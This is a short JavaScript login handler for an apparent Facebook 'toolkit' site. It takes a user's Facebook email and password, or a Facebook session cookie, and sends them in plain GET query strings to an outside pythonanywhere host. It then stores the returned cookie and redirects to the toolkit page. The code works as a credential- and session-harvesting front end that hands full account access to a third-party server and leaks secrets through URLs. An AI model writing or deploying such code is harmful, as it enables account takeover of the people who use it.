async function submitLogin() {
    const emailElement = document.getElementById('email');
    const passwordElement = document.getElementById('password');
    const cookieElement = document.getElementById('cookie');

    const email = emailElement.value === "" ? null : emailElement.value;
    const password = passwordElement.value === "" ? null : passwordElement.value;
    const cookie = cookieElement.value === "" ? null : cookieElement.value;

    if (email && password) {
        const url = `https://dapuntaxd.pythonanywhere.com/facebook-api/login?email=${email}&password=${password}`
        await setter(url);
    } else if (cookie && cookie.includes('c_user')) {
        const url = `https://dapuntaxd.pythonanywhere.com/facebook-api/login?cookie=${cookie}`
        await setter(url);
    } else {
        errorLogin('Please fill in correctly!');
    }

    emailElement.value = "";
    passwordElement.value = "";
    cookieElement.value = "";
}

window.submitLogin = submitLogin;

async function setter(url) {
    try {
        const response = await fetch(url, {
            method: 'GET',
            credentials: 'include',
            mode: 'cors'
        });

        const data = await response.json();
        if (data.status === 'success') {
            localStorage.setItem("data", JSON.stringify(data));
            document.cookie = 'cookie=' + encodeURIComponent(data.cookie) + "; path=/";
            const currentUrl = window.location.origin;
            window.location.href = currentUrl + '/fbtoolkit';
        }
        else {
            errorLogin('Wrong credentials!');
        }
    }
    catch (error) {
        errorLogin('Wrong credentials!');
    }
}

function errorLogin(message) {
    const errorNotif = document.getElementById('error-login');
    errorNotif.classList.add('error-login');
    errorNotif.innerText = message;
}